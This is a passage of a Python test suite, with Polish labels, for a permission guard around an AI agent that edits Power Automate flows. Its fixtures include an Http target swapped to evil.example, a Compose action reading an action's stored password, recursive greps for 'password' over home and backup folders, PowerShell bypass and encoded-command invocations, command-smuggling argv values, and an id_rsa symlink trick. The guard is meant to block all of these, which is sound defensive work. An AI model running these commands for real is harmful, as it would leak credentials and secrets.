print("29. 1.2.0 po przegladzie: zaleznosci akcji wysylajacych, typy, zakresy, kroki http i cli, kopie w powloce")
DEF4 = {"properties": {"definition": {"triggers": {}, "actions": {
    "Init_base": {"type": "InitializeVariable", "runAfter": {},
                  "inputs": {"variables": [{"name": "base", "type": "string", "value": "https://api.partner.pl"}]}},
    "Compose_naglowek": {"type": "Compose", "runAfter": {"Init_base": ["Succeeded"]}, "inputs": "Basic abc"},
    "Compose_tekst": {"type": "Compose", "runAfter": {"Init_base": ["Succeeded"]}, "inputs": "Dzien dobry"},
    "I": {"type": "If", "runAfter": {"Compose_naglowek": ["Succeeded"]}, "expression": {"equals": [1, 1]},
          "actions": {}, "else": {"actions": {
              "H2": {"type": "Http", "runAfter": {}, "inputs": {"method": "DELETE", "uri": "https://api.partner.pl/x"}}}}},
    "H": {"type": "Http", "runAfter": {"I": ["Succeeded"]},
          "inputs": {"method": "POST", "uri": "@{variables('base')}/x",
                     "headers": {"Authorization": "@{outputs('Compose_naglowek')}"},
                     "authentication": {"type": "Basic", "username": "u", "password": "p"}, "body": "@{1}"}}}}}}
A4 = ["properties", "definition", "actions"]
expect("zaleznosci: zmienna i Compose uzyte w adresie i naglowkach", C.sensitive_refs(DEF4),
       {("var", "base"), ("act", "compose_naglowek")})


def chain(actions):
    return {"properties": {"definition": {"triggers": {}, "actions": actions}}}


HTTP_ = lambda uri, ra=None: {"type": "Http", "runAfter": ra or {}, "inputs": {"method": "POST", "uri": uri}}  # noqa: E731
for label, actions, target in [
    ("Compose -> Select -> Http", {"Cmp": {"type": "Compose", "inputs": "https://a"},
                                    "Sel": {"type": "Select", "inputs": {"from": "@outputs('Cmp')", "select": "@item()"}},
                                    "H": HTTP_("@{body('Sel')}")}, "cmp"),
    ("Compose -> zmienna -> Http", {"Cmp": {"type": "Compose", "inputs": "https://a"},
                                     "Init": {"type": "InitializeVariable", "inputs": {"variables": [{"name": "u", "value": "@{outputs('Cmp')}"}]}},
                                     "H": HTTP_("@{variables('u')}")}, "cmp"),
    ("Foreach nad Compose, item()", {"Cmp": {"type": "Compose", "inputs": ["https://a"]},
                                      "FE": {"type": "Foreach", "foreach": "@outputs('Cmp')", "actions": {"H": HTTP_("@{item()}")}}}, "cmp"),
    ("wielkosc liter w nazwie zmiennej", {"Init": {"type": "InitializeVariable", "inputs": {"variables": [{"name": "base", "value": "https://a"}]}},
                                           "H": HTTP_("@{variables('BASE')}")}, "init"),
    ("nazwa wyliczana", {"Cmp": {"type": "Compose", "inputs": "x"}, "H": HTTP_("@{variables(concat('ba','se'))}")}, "cmp"),
]:
    d = chain(actions)
    names = {n for n, (_, a) in C.flatten_actions(d["properties"]["definition"]["actions"])[0].items() if n.lower() == target}
    hit = C.sensitive_hit(C.defines(next(iter(names)), C.flatten_actions(d["properties"]["definition"]["actions"])[0][next(iter(names))][1]),
                          C.sensitive_refs(d))
    expect(f"zaleznosci domkniete: {label}", bool(hit), True)
expect("defines: klucze Inputs/Name wielka litera",
       C.defines("S", {"type": "SetVariable", "Inputs": {"Name": "Base", "value": "x"}}), {("act", "s"), ("var", "base")})
expect("result() jako odczyt hasel", bool(C.SECRET_REF_RE.search("@result('Scope')")), True)


def live4(changes, definition=DEF4):
    wf = {"ismanaged": False, "category": 5, "modifiedon": "m", "clientdata": json.dumps(definition)}
    return C.flow_patch_live_problems({"oczekiwany_modifiedon": "m", "zmiany": changes}, wf)[0]


expect("flow-patch: zmienna z adresem Http odrzucona",
       any("akcja wysylajaca" in e for e in live4([{"sciezka": A4 + ["Init_base", "inputs", "variables", "0", "value"],
                                                   "bylo": "https://api.partner.pl", "ma_byc": "https://evil.example"}])), True)
expect("flow-patch: Compose z naglowkiem Http odrzucony",
       any("akcja wysylajaca" in e for e in live4([{"sciezka": A4 + ["Compose_naglowek", "inputs"], "bylo": "Basic abc",
                                                   "ma_byc": "Basic zzz"}])), True)
expect("flow-patch: Compose bez zwiazku z Http dozwolony",
       live4([{"sciezka": A4 + ["Compose_tekst", "inputs"], "bylo": "Dzien dobry", "ma_byc": "Witamy"}]), [])
expect("flow-patch: odczyt wejsc akcji z haslem odrzucony",
       any("authentication" in e for e in live4([{"sciezka": A4 + ["Compose_tekst", "inputs"], "bylo": "Dzien dobry",
                                                  "ma_byc": "@actions('H').inputs.authentication.password"}])), True)
expect("runAfter: status niebedacy tekstem bez wyjatku", bool(C.run_after_problem({"I": [["Succeeded"]]})), True)
expect("runAfter: ostatni klucz pod body to nie runAfter",
       C.flow_patch_problems({"srodowisko": DV, "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z",
                              "zmiany": [{"sciezka": A4 + ["H", "inputs", "body", "runAfter"], "bylo": "a", "ma_byc": "b"}]}, 1)
       == [] or all("runAfter." not in e for e in C.flow_patch_problems(
           {"srodowisko": DV, "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z",
            "zmiany": [{"sciezka": A4 + ["H", "inputs", "body", "runAfter"], "bylo": "a", "ma_byc": "b"}]}, 1)), True)


def fd4(change):
    d = copy.deepcopy(DEF4)
    change(d["properties"]["definition"]["actions"])
    return wf_live(DEF4, d)


for label, change, needle in [
    ("SetVariable ustawiajaca adres", lambda a: a.update(Set_base={"type": "SetVariable", "runAfter": {"Compose_tekst": ["Succeeded"]},
                                                                    "inputs": {"name": "base", "value": "https://evil.example"}}), "akcja wysylajaca"),
    ("zmiana Compose z naglowkiem", lambda a: a["Compose_naglowek"].update(inputs="Basic zzz"), "akcja wysylajaca"),
    ("usuniecie akcji z adresem", lambda a: (a.pop("Init_base"), a["Compose_naglowek"].update(runAfter={}),
                                              a["Compose_tekst"].update(runAfter={})), "akcja wysylajaca"),
    ("Compose czyta haslo", lambda a: a.update(Kradnij={"type": "Compose", "runAfter": {},
                                                        "inputs": "@actions('H').inputs.authentication.password"}), "authentication"),
    ("Type wielka litera", lambda a: a.update(X={"Type": "Http", "runAfter": {}, "inputs": "@json(variables('cfg'))"}), "X"),
    ("dwa klucze typu", lambda a: a["Compose_tekst"].update(Type="Http"), "wielkoscia liter"),
    ("typ spoza listy", lambda a: a.update(J={"type": "JavaScriptCode", "runAfter": {}, "inputs": {"code": "x"}}), "JavaScriptCode"),
    ("akcje jako lista", lambda a: a.update(S={"type": "Scope", "runAfter": {}, "actions": [{"type": "Http"}]}), "S"),
    ("akcje jako tekst w Http", lambda a: a["H"].update(actions="x"), "H"),
    ("zamaskowane haslo w tresci", lambda a: a["Compose_tekst"].update(inputs={"password": "***"}), "***"),
    ("H2 przeniesiona do zakresu o nazwie else", lambda a: (a["I"]["else"]["actions"].pop("H2"), a["I"]["actions"].update(
        {"else": {"type": "Scope", "runAfter": {}, "actions": {"H2": {"type": "Http", "runAfter": {},
                                                                     "inputs": {"method": "DELETE", "uri": "https://api.partner.pl/x"}}}}})), "H2"),
]:
    expect(f"flow-definition odrzuca: {label}", any(needle in e for e in fd4(change)), True)
expect("flow-definition: nowa Compose bez zwiazku z Http dozwolona",
       fd4(lambda a: a.update(Nowa={"type": "Compose", "runAfter": {"Compose_tekst": ["Succeeded"]}, "inputs": "x"})), [])
diff, _ = C.flow_definition_diff(DEF4, (lambda d: (d["properties"]["definition"]["actions"].update(
    Nowa={"type": "Compose", "runAfter": {}, "inputs": "@{formatDateTime(utcNow())}"}), d)[1])(copy.deepcopy(DEF4)))
expect("flow-definition: podglad tresci dodanej akcji", "formatDateTime" in (diff[0].get("podglad") or ""), True)

for label, step, bad in [
    ("PUT workflows/clientdata", {"metoda": "PUT", "url": f"{DV}/api/data/v9.2/workflows({WF3})/clientdata", "body": {"value": "{}"}}, True),
    ("PATCH workflows z clientdata", {"metoda": "PATCH", "url": f"{DV}/api/data/v9.2/workflows({WF3})", "body": {"clientdata": "{}"}}, True),
    ("POST workflows (nowy flow)", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/workflows", "body": {"name": "x"}}, True),
    ("PATCH workflows statecode", {"metoda": "PATCH", "url": f"{DV}/api/data/v9.2/workflows({WF3})", "body": {"statecode": 0, "statuscode": 1}}, False),
    ("$batch", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/$batch", "body": {}}, True),
    ("$batch zakodowany", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/%24batch", "body": {}}, True),
    ("ImportSolution", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/ImportSolution", "body": {}}, True),
    ("korekta rekordu", {"metoda": "PATCH", "url": f"{DV}/api/data/v9.2/eko_units({WF3})", "body": {"eko_meteringpoint@odata.bind": "/eko_meteringpoints(x)"}}, False),
    ("Flow API: nowy flow", {"metoda": "POST", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows?api-version=2016-11-01", "body": {}}, True),
    ("Flow API: PATCH flow", {"metoda": "PATCH", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOW}?api-version=2016-11-01", "body": {"properties": {}}}, True),
    ("Flow API: stop", {"metoda": "POST", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOW}/stop?api-version=2016-11-01"}, False),
    ("Flow API: resubmit", {"metoda": "POST", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOW}/triggers/manual/histories/x/resubmit?api-version=2016-11-01"}, False),
]:
    errs = C.step_problems({"nr": 1, "opis": "x", "typ": "http", **step}, 1)
    expect(f"krok http: {label} {'odrzucony' if bad else 'dozwolony'}", bool(errs), bad)
for argv, bad in [(["pac", "solution", "import", "--path", "x.zip"], True), (["pac", "solution", "upgrade"], True),
                  (["az", "logicapp", "deploy"], True), (["pac", "solution", "list"], False)]:
    expect(f"krok cli: {' '.join(argv)}", bool(C.step_problems({"nr": 1, "opis": "x", "typ": "cli", "argv": argv}, 1)), bad)

INC_DIR = WORK / "zgloszenia" / "FD-1"
for label, cmd, cwd, want in [
    ("cat kopii", "cat zgloszenia/FD-1/backup/x.json", WORK, "deny"),
    ("grep po kopiach", 'grep -r password "zgloszenia/FD-1/backup"', WORK, "deny"),
    ("cp z kopii", "cp zgloszenia/FD-1/backup/x.json zgloszenia/FD-2/", WORK, "deny"),
    ("wzgledna kopia z katalogu zgloszenia", "cat backup/x.json", INC_DIR, "deny"),
    ("z wnetrza backup", "cat x.json", INC_DIR / "backup", "deny"),
    ("ls zgloszenia", "ls zgloszenia/FD-1", WORK, None),
    ("backup w innym projekcie", "ls backup/", OTHER, None),
]:
    (INC_DIR / "backup").mkdir(parents=True, exist_ok=True)
    expect(f"powloka i kopie: {label}", guard_in("sesja-29", "Bash", {"command": cmd}, cwd), want)

cfg["flow_patch_dataverse_urls"] = []
cfg["flow_definition_dataverse_urls"] = []
C.save_config(cfg)

print("30. 1.2.1: odmowy SharePoint z wyjasnieniem (ITS-418)")
P = importlib.reload(P)
P.az_account = lambda: "e2vitservice@ekovoltis.pl"
GSITE = "https://graph.microsoft.com/v1.0/sites/colpro.sharepoint.com:/sites/BazadokumentowEkovoltis"
SECRET_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOi.tajny.podpis"
P.get_token = lambda resource: SECRET_TOKEN
ANSWERS = {GSITE + ":/drive/root:/Rozliczenia niestandardowe/Template:/children": (403, b'{"error": {"code": "accessDenied"}}'),
           "https://colpro.sharepoint.com/sites/BazadokumentowEkovoltis/_api/web": (401, b'{"error": "invalid_request"}'),
           GSITE: (200, b'{"id": "x"}')}
P.http = lambda m, u, b=None, timeout=90, headers=None: ANSWERS.get(u, (404, b"{}"))
for label, url, needle in [("Graph 403 na bibliotece", GSITE + ":/drive/root:/Rozliczenia niestandardowe/Template:/children", "e2vitservice"),
                           ("REST 401", "https://colpro.sharepoint.com/sites/BazadokumentowEkovoltis/_api/web", "przez Graph"),
                           ("Graph 200 bez uwagi", GSITE, None)]:
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        try:
            P.cmd_get([url])
        except SystemExit:
            pass
    text_out = buf.getvalue()
    expect(f"SharePoint: {label}", (needle in text_out) if needle else ("Uwaga:" not in text_out), True)
    expect(f"SharePoint: {label}: bez tokenu", SECRET_TOKEN in text_out, False)
expect("SharePoint: 403 z Dataverse bez uwagi o SharePoint", P.access_hint(f"{DV}/api/data/v9.2/x", 403), None)
expect("SharePoint: 401 z Graph poza witrynami bez uwagi", P.access_hint("https://graph.microsoft.com/v1.0/me", 401), None)

print("31. 1.2.2: kopie definicji w stanie, Read i Grep na stanie, rekurencja od domu, az w kroku cli")
import stat as _stat31  # noqa: E402
cfg["flow_definition_dataverse_urls"] = [DV]
C.save_config(cfg)
KOPIA = sorted(C.backup_dir("FD-1").glob(f"{WF3}-*.json"))[0]
SHA_K = C.file_sha256(KOPIA)
expect("kopie: odnosnik backup/ rozwiazany do stanu",
       C.step_file_path(WORK / "zgloszenia/FD-1", f"backup/{KOPIA.name}"), KOPIA)
expect("kopie: kopia innego zgloszenia po jednoznacznej nazwie",
       C.step_file_path(WORK / "zgloszenia/FD-9", f"backup/{KOPIA.name}"), KOPIA)
text = fd_plan("FD-5", f"backup/{KOPIA.name}", SHA_K)
(WORK / "zgloszenia/FD-5").mkdir(parents=True, exist_ok=True)
(WORK / "zgloszenia/FD-5/plan.md").write_text(text, encoding="utf-8")
expect("kopie: plan z kopia w stanie przechodzi walidacje hooka i ppcall",
       C.check_plan(text, WORK / "zgloszenia/FD-5")[0], [])
accept("FD-5", text)
expect("kopie: hook znajduje kopie w stanie i pyta o exec", decision(f"{Q} exec FD-5 1"), "ask")
bad_text = fd_plan("FD-5", f"backup/{KOPIA.name}", "0" * 64)
(WORK / "zgloszenia/FD-5/plan.md").write_text(bad_text, encoding="utf-8")
expect("kopie: zly skrot kopii -> hook odmawia", decision(f"{Q} exec FD-5 1"), "deny")
expect("kopie: brak kopii -> blad walidacji",
       any("brak pliku" in e for e in C.check_plan(fd_plan("FD-5", f"backup/{WF3}-20200101T000000Z.json", SHA_K),
                                                   WORK / "zgloszenia/FD-5")[0]), True)

print("   przeniesienie kopii sprzed 1.2.2")
LEG = WORK / "zgloszenia/FD-6/backup"
LEG.mkdir(parents=True, exist_ok=True)
leg1 = LEG / f"{WF3}-20261101T100000Z.json"
leg1.write_text('{"properties": {"definition": {"actions": {}}}}', encoding="utf-8")
os.chmod(leg1, _stat31.S_IREAD)
sha_leg = C.file_sha256(leg1)
expect("przejsciowo: odnosnik wskazuje stara kopie, dopoki nie przeniesiona",
       C.step_file_path(WORK / "zgloszenia/FD-6", f"backup/{leg1.name}"), leg1)
expect("przejsciowo: Grep po zgloszeniach ze stara kopia zablokowany",
       guard_in("sesja-31-uspiona", "Grep", {"pattern": "password", "path": str(WORK / "zgloszenia")}, WORK), "deny")
leg2 = LEG / f"{WF3}-20261101T110000Z.json"
leg2.write_text('{"a": 1}', encoding="utf-8")
C.backup_dir("FD-6").mkdir(parents=True, exist_ok=True)
(C.backup_dir("FD-6") / leg2.name).write_text('{"a": 2}', encoding="utf-8")  # konflikt nazwy
with contextlib.redirect_stdout(io.StringIO()):
    left = P.migrate_legacy_backups("FD-6")
moved = C.backup_dir("FD-6") / leg1.name
expect("przeniesienie: kopia w stanie z tym samym skrotem", moved.is_file() and C.file_sha256(moved) == sha_leg, True)
expect("przeniesienie: kopia w stanie tylko do odczytu", not os.stat(moved).st_mode & _stat31.S_IWRITE, True)
expect("przeniesienie: oryginal usuniety", leg1.exists(), False)
expect("przeniesienie: konflikt nazwy zostaje na miejscu", (left, leg2.exists()), ([leg2.name], True))
expect("przeniesienie: po przeniesieniu odnosnik wskazuje stan",
       C.step_file_path(WORK / "zgloszenia/FD-6", f"backup/{leg1.name}"), moved)
leg2.unlink()
with contextlib.redirect_stdout(io.StringIO()):
    P.migrate_legacy_backups("FD-6")
expect("przeniesienie: pusty katalog backup/ usuniety", LEG.exists(), False)
expect("przeniesienie: niepoprawny identyfikator ignorowany", P.migrate_legacy_backups("../x"), [])

print("   nazwy kopii unikalne w calym stanie (wycofanie z innego zgloszenia)")
_now = C.now
C.now = lambda: _now().replace(year=2030, month=1, day=1, hour=0, minute=0, second=0)
try:
    STEP_U = {"workflowid": WF3}
    first = P.backup_path("UNQ-1", STEP_U)
    first.parent.mkdir(parents=True, exist_ok=True)
    first.write_text('{"a": 1}', encoding="utf-8")
    second = P.backup_path("UNQ-2", STEP_U)
finally:
    C.now = _now
expect("kopie: ta sama sekunda w innym zgloszeniu -> inna nazwa", first.name != second.name, True)
twin = C.backup_dir("UNQ-3") / first.name  # kopia sprzed poprawki o tej samej nazwie w innym zgloszeniu
twin.parent.mkdir(parents=True, exist_ok=True)
twin.write_text('{"a": 2}', encoding="utf-8")
expect("kopie: dwie kopie o tej samej nazwie -> wybor po skrocie z planu",
       C.step_file_path(WORK / "zgloszenia/UNQ-9", f"backup/{first.name}", C.file_sha256(twin)), twin)
expect("kopie: dwie kopie o tej samej nazwie bez pasujacego skrotu -> brak",
       C.step_file_path(WORK / "zgloszenia/UNQ-9", f"backup/{first.name}", "0" * 64).is_file(), False)

print("   Read i Grep na stanie (zawsze, takze poza rozmowa dyzurna)")
S31 = "sesja-31-uspiona"
for label, tool, tin, cwd, want in [
    ("Read kopii w stanie", "Read", {"file_path": str(KOPIA)}, OTHER, "deny"),
    ("Read akceptacji", "Read", {"file_path": str(TMP / "state/akceptacje/FD-5.json")}, OTHER, "deny"),
    ("Read rejestru kopii", "Read", {"file_path": str(TMP / "state/kopie.jsonl")}, OTHER, "deny"),
    ("Read zwyklego pliku", "Read", {"file_path": str(WORK / "zgloszenia/FD-5/plan.md")}, OTHER, None),
    ("Read wzgledny z wnetrza stanu", "Read", {"file_path": "kopie.jsonl"}, TMP / "state", "deny"),
    ("Grep w kopiach", "Grep", {"pattern": "password", "path": str(C.backup_dir("FD-1"))}, OTHER, "deny"),
    ("Grep od przodka stanu", "Grep", {"pattern": "password", "path": str(TMP)}, OTHER, "deny"),
    ("Grep bez sciezki z cwd w stanie", "Grep", {"pattern": "password"}, TMP / "state", "deny"),
    # inne sekcje zostawiaja stare katalogi backup/ w zgloszenia/, wiec Grep po calosci jest tu blokowany
    ("Grep w zgloszeniu (kopie w stanie)", "Grep", {"pattern": "password", "path": str(WORK / "zgloszenia/FD-5")}, WORK, None),
    ("Grep w projekcie", "Grep", {"pattern": "def ", "path": str(ROOT / "scripts")}, OTHER, None),
]:
    expect(f"narzedzia: {label}", guard_in(S31, tool, tin, cwd), want)

print("   rekurencja od domu albo .claude w rozmowie dyzurnej")
S31A = "sesja-31-dyzur"
guard_in(S31A, "Skill", {"skill": "pp-support:zgloszenie"})
for label, tool, cmd, cwd, want in [
    ("grep -r od przodka stanu", "Bash", f'grep -r password "{TMP}"', WORK, "deny"),
    ("grep -rn ze wzorcem", "Bash", f'grep -rn password "{TMP}"/st*', WORK, "deny"),
    ("find od przodka stanu", "Bash", f'find "{TMP}" -name "*.json"', WORK, "deny"),
    ("tar katalogu nad stanem", "Bash", f'tar czf x.tgz "{TMP}"', WORK, "deny"),
    ("rg z cwd nad stanem", "Bash", "rg password", TMP, "deny"),
    ("Get-ChildItem -Recurse", "PowerShell", f'Get-ChildItem "{TMP}" -Recurse | Select-String password', WORK, "deny"),
    ("gci -r", "PowerShell", f'gci -r "{TMP}"', WORK, "deny"),
    ("grep -r w projekcie", "Bash", "grep -r password zgloszenia/FD-5", WORK, None),
    ("grep bez rekurencji", "Bash", f'grep password "{TMP}/x.txt"', WORK, None),
    ("ls -la nad stanem", "Bash", f'ls -la "{TMP}"', WORK, None),
]:
    expect(f"rekurencja: {label}", guard_in(S31A, tool, {"command": cmd}, cwd), want)
expect("rekurencja: poza rozmowa dyzurna bez blokady",
       guard_in(S31, "Bash", {"command": f'grep -r password "{TMP}"'}, WORK), None)
_saved_state = os.environ["PP_SUPPORT_STATE_DIR"]
os.environ["PP_SUPPORT_STATE_DIR"] = str(Path.home() / ".claude" / C.STATE_DIR_NAME)
try:
    for label, cmd, dialect, want in [
        ("grep -r ~", "grep -r password ~", "bash", True),
        ("find $HOME", "find $HOME -name x", "bash", True),
        ("rg ~/.claude", "rg --hidden password ~/.claude", "bash", True),
        ("tar ~/.c*", "tar czf x.tgz ~/.c*", "bash", True),
        ("gci $env:USERPROFILE\\.claude", "Get-ChildItem $env:USERPROFILE\\.claude -Recurse", "powershell", True),
        ("Compress-Archive ~", "Compress-Archive -Path ~ -DestinationPath x.zip", "powershell", True),
        ("grep -r ~/projekt", "grep -r password ~/projekt", "bash", False),
        ("find ~/.claude/plugins", "find ~/.claude/plugins -name x", "bash", False),
    ]:
        expect(f"rekurencja od domu: {label}", G.recursive_reaches_state(G.tokenize(cmd, dialect), str(WORK)), want)
finally:
    os.environ["PP_SUPPORT_STATE_DIR"] = _saved_state

print("   krok cli z az: tylko jawnie dozwolone polecenia")
for argv, bad in [
    (["az", "logic", "workflow", "update", "-g", "rg", "-n", "wf", "--definition", "d.json"], True),
    (["az", "logic", "workflow", "create", "-g", "rg", "-n", "wf"], True),
    (["az", "webapp", "config", "appsettings", "set", "-n", "x", "-g", "y", "--settings", "A=1"], True),
    (["az", "resource", "update", "--ids", "x", "--set", "properties.state=Enabled"], True),
    (["az", "role", "assignment", "create", "--role", "Owner"], True),
    (["az", "--subscription", "s", "webapp", "restart", "-n", "x", "-g", "y"], True),
    (["az", "webapp", "restart", "-n", "@plik", "-g", "y"], True),
    (["az", "webapp", "restart", "--name=@plik", "-g", "y"], True),
    (["az", "logic", "workflow", "enable", "-g", "rg", "-n", "wf"], False),
    (["az", "logic", "workflow", "disable", "-g", "rg", "-n", "wf"], False),
    (["az", "webapp", "restart", "-n", "x", "-g", "y"], False),
    (["az", "functionapp", "restart", "-n", "x", "-g", "y"], False),
    (["pac", "solution", "list"], False),
]:
    expect(f"krok cli: {' '.join(argv)}", bool(C.step_problems({"nr": 1, "opis": "x", "typ": "cli", "argv": argv}, 1)), bad)
_http_step = ('"typ": "http", "metoda": "POST",\n   "url": "https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/'
              'environments/env1/flows/abc/start?api-version=2016-11-01"')
bad_plan = PLAN.replace(_http_step, '"typ": "cli", "argv": ["az", "logic", "workflow", "update", "-g", "rg", "-n", "wf", '
                                    '"--definition", "d.json"]')
expect("krok cli: plan z az update nie przechodzi plan-check", bad_plan != PLAN and bool(C.check_plan(bad_plan)[0]), True)
cfg["flow_definition_dataverse_urls"] = []
C.save_config(cfg)

print("   po przegladzie 1.2.2: kopie we wzorcach, cd, nakladki, cmd.exe, dowiazania, dziennik")
for label, cmd, want in [
    ("cd ~/.claude i wzorzec na kopie", "cd ~/.claude && cat */kopie/*/*.json", "deny"),
    ("dopisanie do rejestru kopii wzorcem", "cd ~/.claude && echo x >> */kopie.jsonl", "deny"),
    ("Set-Location i wzorzec na kopie", "Set-Location ~/.claude; Get-Content */kopie/*/*", "deny"),
    ("slowo kopie bez odniesienia do domu", "ls kopie/", None),
]:
    dialect_tool = "PowerShell" if cmd.startswith("Set-Location") else "Bash"
    expect(f"kopie we wzorcach: {label}", guard_in(S31, dialect_tool, {"command": cmd}, WORK), want)
_saved_state = os.environ["PP_SUPPORT_STATE_DIR"]
os.environ["PP_SUPPORT_STATE_DIR"] = str(Path.home() / ".claude" / C.STATE_DIR_NAME)
try:
    for label, cmd, dialect, want in [
        ("cd ~ && grep -rn .", "cd ~ && grep -rn pw .", "bash", True),
        ("samo cd i grep -r", "cd; grep -r pw .", "bash", True),
        ("Set-Location i gci -Recurse", "Set-Location ~\\.claude; Get-ChildItem -Recurse", "powershell", True),
        ("command grep -r", "command grep -r pw ~", "bash", True),
        ("timeout find", "timeout 10 find ~ -name x", "bash", True),
        ("env grep -r", "env LC_ALL=C grep -r pw ~", "bash", True),
        ("xargs grep -r", "echo ~ | xargs grep -r pw", "bash", True),
        ("cmd /c z cudzyslowem", 'cmd /c "dir /s %USERPROFILE%\\.claude"', "bash", True),
        ("cmd /c dir /s w PowerShell", "cmd /c dir /s %USERPROFILE%\\.claude", "powershell", True),
        ("gci -Depth", "Get-ChildItem ~ -Depth 10", "powershell", True),
        ("${env:USERPROFILE}", "Get-ChildItem -Path ${env:USERPROFILE} -Recurse", "powershell", True),
        ("-Path:$HOME", "Get-ChildItem -Path:$HOME -Recurse", "powershell", True),
        ("grep --directories=recurse", "grep --directories=recurse pw ~/.claude", "bash", True),
        ("grep -d recurse", "grep -d recurse pw ~", "bash", True),
        ("ls -ltr ~ w bashu", "ls -ltr ~", "bash", False),
        ("ls -R ~ w bashu", "ls -R ~", "bash", True),
        ("cd do projektu i grep -r", "cd ~/projekt && grep -r pw .", "bash", False),
        ("bash -c z grep -r", 'bash -c "grep -r pw ~"', "bash", True),
        ("pwsh -Command z gci -Recurse", 'pwsh -Command "Get-ChildItem ~ -Recurse"', "powershell", True),
        ("powershell -EncodedCommand", "powershell -EncodedCommand ZABpAHIA", "powershell", True),
        ("bash -c bez rekurencji", 'bash -c "ls ~"', "bash", False),
        ("powershell bez -Command", "powershell Get-ChildItem ~ -Recurse", "powershell", True),
        ("pwsh -NoProfile -c", 'pwsh -NoProfile -c "gci -r ~"', "powershell", True),
        ("bash skrypt", "bash skrypt.sh", "bash", False),
        ("powershell -ExecutionPolicy Bypass -Command", 'powershell -ExecutionPolicy Bypass -Command "gci ~ -Recurse"', "powershell", True),
        ("powershell -ep Bypass bez -Command", "powershell -ep Bypass Get-ChildItem ~ -Recurse", "powershell", True),
        ("powershell skrot -Execution", "powershell -Execution Bypass gci -r ~", "powershell", True),
        ("powershell nieznana opcja", "powershell -Cos gci -r ~", "powershell", True),
        ("pwsh -NoProfile -File", "pwsh -NoProfile -File skrypt.ps1", "powershell", False),
        ("powershell -wd ~ -c", 'powershell -wd ~ -c "gci -r ."', "powershell", True),
        ("pwsh -WorkingDirectory:~/.claude", 'pwsh -WorkingDirectory:~/.claude -Command "gci -Recurse"', "powershell", True),
        ("pwsh -File - (stdin)", "pwsh -File -", "powershell", True),
        ("pwsh -Command - (stdin)", "pwsh -Command -", "powershell", True),
        ("echo | bash (stdin)", 'echo "grep -r x ~" | bash', "bash", True),
        ("bash -s < plik", "bash -s < cmd.txt", "bash", True),
        ("bash -o pipefail -c", 'bash -o pipefail -c "grep -r x ~"', "bash", True),
        ("bash skrypt z -c w argumentach", "bash skrypt.sh -c x", "bash", False),
        ("bash +o pipefail -c", 'bash +o pipefail -c "grep -r x ~"', "bash", True),
        ("bash -so pipefail (stdin)", "echo 'grep -r x ~' | bash -so pipefail x", "bash", True),
        ("bash -co", 'bash -co pipefail "grep -r x ~"', "bash", True),
        ("bash -eo pipefail -c", 'bash -eo pipefail -c "grep -r x ~"', "bash", True),
        ("powershell /wd ~", 'powershell /wd ~ /c "gci -r ."', "powershell", True),
        ("powershell /WorkingDirectory:~", 'powershell /WorkingDirectory:~ -Command "gci -r ."', "powershell", True),
    ] + ([("find /c", "find /c -name x", "bash", True),  # dysk w Git Bash i cmd (tylko Windows)
          ("grep -r C:", "grep -r x C:", "bash", True)] if os.name == "nt" else []):
        toks = G.tokenize(G.split_segments(cmd, dialect)[-1].strip(), dialect)
        expect(f"rekurencja po przegladzie: {label}", G.recursive_reaches_state(toks, str(WORK), dialect, cmd), want)
finally:
    os.environ["PP_SUPPORT_STATE_DIR"] = _saved_state
for argv, bad in [
    (["az", "webapp", "restart", "-n", "x&calc", "-g", "y"], True),
    (["az", "webapp", "restart", "-n", "x", "-g", "y|more"], True),
    (["az", "webapp", "restart", "-n", "%COMSPEC%", "-g", "y"], True),
    (["az", "webapp", "restart", "-n", 'x" & calc & "', "-g", "y"], True),
    (["az", "webapp", "restart", "--%", "-n", "x"], True),
    (["pac", "org", "select", "--environment", "https://x.crm4.dynamics.com/"], False),
]:
    expect(f"krok cli (cmd.exe): {' '.join(argv)}",
           bool(C.step_problems({"nr": 1, "opis": "x", "typ": "cli", "argv": argv}, 1)), bad)

VICTIM = TMP / "cudzy-katalog"
VICTIM.mkdir(exist_ok=True)
(VICTIM / "id_rsa").write_text("tajne", encoding="utf-8")
LINK_DIR = WORK / "zgloszenia/MIG-2"
LINK_DIR.mkdir(parents=True, exist_ok=True)
linked = False
try:
    if os.name == "nt":
        linked = subprocess.run(["cmd", "/c", "mklink", "/J", str(LINK_DIR / "backup"), str(VICTIM)],
                                capture_output=True).returncode == 0
    else:
        os.symlink(VICTIM, LINK_DIR / "backup")
        linked = True
except OSError:
    linked = False
if linked:
    with contextlib.redirect_stdout(io.StringIO()):
        P.migrate_legacy_backups("MIG-2")
    expect("migracja: dowiazanie backup/ pominiete", ((VICTIM / "id_rsa").exists(),
                                                      (C.backup_dir("MIG-2") / "id_rsa").exists()), (True, False))
    if os.name == "nt":
        subprocess.run(["cmd", "/c", "rmdir", str(LINK_DIR / "backup")], capture_output=True)
    else:
        (LINK_DIR / "backup").unlink()
    VICTIM2 = TMP / "cudze-zgloszenie"
    (VICTIM2 / "backup").mkdir(parents=True, exist_ok=True)
    (VICTIM2 / "backup" / "id_rsa").write_text("tajne", encoding="utf-8")
    LINK_INC = WORK / "zgloszenia/MIG-4"
    if os.name == "nt":
        subprocess.run(["cmd", "/c", "mklink", "/J", str(LINK_INC), str(VICTIM2)], capture_output=True)
    else:
        os.symlink(VICTIM2, LINK_INC)
    with contextlib.redirect_stdout(io.StringIO()):
        P.migrate_legacy_backups("MIG-4")
    expect("migracja: dowiazanie katalogu zgloszenia pominiete",
           ((VICTIM2 / "backup" / "id_rsa").exists(), (C.backup_dir("MIG-4") / "id_rsa").exists()), (True, False))
    if os.name == "nt":
        subprocess.run(["cmd", "/c", "rmdir", str(LINK_INC)], capture_output=True)
    else:
        LINK_INC.unlink()
else:
